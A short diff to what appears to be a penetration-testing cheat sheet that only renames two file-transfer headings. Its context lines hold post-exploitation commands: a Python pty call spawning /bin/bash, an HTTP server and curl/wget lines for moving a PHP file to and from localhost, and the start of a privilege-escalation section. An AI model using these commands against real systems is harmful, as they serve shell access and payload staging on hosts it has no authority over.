@@ -33,9 +33,9 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 ## Python
 python3 -m http.server 8080
 # File Transfer
-## Curl
+## Curl (upload)
 curl -T file.php -u 'username:password' http://127.0.0.1/
-## Wget
+## Wget (download)
 wget http://127.0.0.1/file.php
 # Privilege Escalation
 ## Crontab
